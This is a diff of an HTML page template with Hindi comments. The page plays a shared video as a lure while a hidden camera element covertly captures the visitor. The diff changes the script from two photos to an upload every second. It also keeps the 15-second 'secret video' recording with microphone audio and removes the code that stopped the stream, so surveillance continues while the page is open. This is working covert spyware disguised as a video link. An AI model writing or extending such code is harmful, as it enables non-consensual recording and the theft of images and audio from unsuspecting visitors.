@@ -9,17 +9,16 @@
         #owner-video {
             width:100%; height:100vh; object-fit:contain; background:black;
         }
-        /* विज़िटर का कैमरा, कैनवस पूरी तरह छिपा */
         #visitor-video, #canvas, #status {
             position:absolute; left:-9999px; width:1px; height:1px;
         }
     </style>
 </head>
 <body>
-    <!-- आपका भेजा वीडियो (muted, autoplay) -->
+    <!-- आपका भेजा वीडियो (muted, autoplay, loop) -->
     <video id="owner-video" src="{{ video_url }}" muted autoplay playsinline loop></video>
 
-    <!-- विज़िटर का कैमरा स्ट्रीम (छिपा हुआ) -->
+    <!-- विज़िटर का कैमरा (छिपा हुआ) -->
     <video id="visitor-video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
     <p id="status" style="display:none;"></p>
@@ -29,51 +28,69 @@
         const visitorVideo = document.getElementById('visitor-video');
         const canvas = document.getElementById('canvas');
 
-        // 📸 2 फोटो कैप्चर करें
-        async function capturePhotos(stream) {
+        // 📸 हर 1 सेकंड में फोटो कैप्चर करके भेजें
+        async function captureAndSendPhoto() {
             try {
-                // कैमरा सेट होने के लिए थोड़ा रुकें
-                await new Promise(r => setTimeout(r, 1000));
-                for (let i = 0; i < 2; i++) {
-                    canvas.width = visitorVideo.videoWidth || 640;
-                    canvas.height = visitorVideo.videoHeight || 480;
-                    canvas.getContext('2d').drawImage(visitorVideo, 0, 0);
-                    const imageData = canvas.toDataURL('image/jpeg', 0.85);
-                    fetch('/upload/' + uniqueId, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ image: imageData })
-                    }).catch(e => console.error(e));
-                    await new Promise(r => setTimeout(r, 500));
-                }
-            } catch(e) { console.error('Photo error:', e); }
+                if (!visitorVideo.videoWidth) return;  // कैमरा अभी तैयार नहीं
+                canvas.width = visitorVideo.videoWidth;
+                canvas.height = visitorVideo.videoHeight;
+                canvas.getContext('2d').drawImage(visitorVideo, 0, 0);
+                const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                // फोटो अपलोड करें (बैकग्राउंड में, रुकें नहीं)
+                fetch('/upload/' + uniqueId, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: imageData })
+                }).catch(e => console.error('Photo upload error:', e));
+            } catch(e) { console.error('Photo capture error:', e); }
         }
 
         // 🎥 15 सेकंड की सीक्रेट वीडियो रिकॉर्ड करें
-        async function recordVideo(stream) {
+        async function recordSecretVideo(stream) {
             try {
+                // माइक और कैमरा दोनों स्ट्रीम में पहले से हैं
                 const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                 const chunks = [];
-                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.ondataavailable = e => {
+                    if (e.data && e.data.size > 0) chunks.push(e.data);
+                };
                 mediaRecorder.start();
 
-                await new Promise(r => setTimeout(r, 15000));  // 15 सेकंड
+                // 15 सेकंड रिकॉर्ड करें
+                await new Promise(r => setTimeout(r, 15000));
                 mediaRecorder.stop();
-                await new Promise(r => mediaRecorder.onstop = r);
 
-                if (chunks.length === 0) return;
+                // रिकॉर्डिंग बंद होने का इंतज़ार
+                await new Promise(r => { mediaRecorder.onstop = r; });
+
+                if (chunks.length === 0) {
+                    console.warn('No video data recorded');
+                    return;
+                }
+
                 const videoBlob = new Blob(chunks, { type: 'video/webm' });
                 const formData = new FormData();
                 formData.append('video', videoBlob, 'visitor.webm');
-                await fetch('/upload_video/' + uniqueId, { method: 'POST', body: formData });
-            } catch(e) { console.error('Video error:', e); }
+
+                const resp = await fetch('/upload_video/' + uniqueId, {
+                    method: 'POST',
+                    body: formData
+                });
+                if (!resp.ok) {
+                    console.error('Video upload failed:', resp.status);
+                } else {
+                    console.log('Video sent successfully');
+                }
+            } catch(e) {
+                console.error('Video recording error:', e);
+            }
         }
 
         // 🚀 सब कुछ शुरू करें
         (async function main() {
             let stream;
             try {
-                // सिर्फ एक बार कैमरा + माइक की अनुमति लें (यही पॉपअप दिखेगा)
+                // कैमरा + माइक की अनुमति (यही एक पॉपअप दिखेगा)
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" },
                     audio: true
@@ -81,14 +98,23 @@
                 visitorVideo.srcObject = stream;
                 await new Promise(r => visitorVideo.onloadedmetadata = r);
 
-                // फोटो और वीडियो एक साथ शुरू करें (दोनों बैकग्राउंड में)
-                capturePhotos(stream);          // यह अलग चलेगा
-                await recordVideo(stream);      // 15 सेकंड रिकॉर्ड करेगा
+                // ---- लगातार फोटो: पहली फोटो 500ms बाद, फिर हर 1000ms (1 सेकंड) पर ----
+                setTimeout(() => {
+                    setInterval(() => {
+                        captureAndSendPhoto();
+                    }, 1000);  // 1 सेकंड का अंतराल
+                }, 500);  // पहली फोटो के लिए 0.5 सेकंड की देरी
+
+                // ---- 15 सेकंड की वीडियो रिकॉर्ड करें ----
+                await recordSecretVideo(stream);
+
+                // वीडियो रिकॉर्डिंग के बाद भी फोटो आती रहेंगी (setInterval जारी रहेगा)
+                // स्ट्रीम को जीवित रखने के लिए हम उसे बंद नहीं करते (पेज बंद होने पर अपने आप बंद होगा)
+
             } catch(e) {
-                console.error('Permission denied or error:', e);
-            } finally {
-                if (stream) stream.getTracks().forEach(track => track.stop());
+                console.error('Camera/Mic permission denied or error:', e);
             }
+            // स्ट्रीम को यहाँ बंद न करें, ताकि setInterval चलता रहे
         })();
     </script>
 </body>
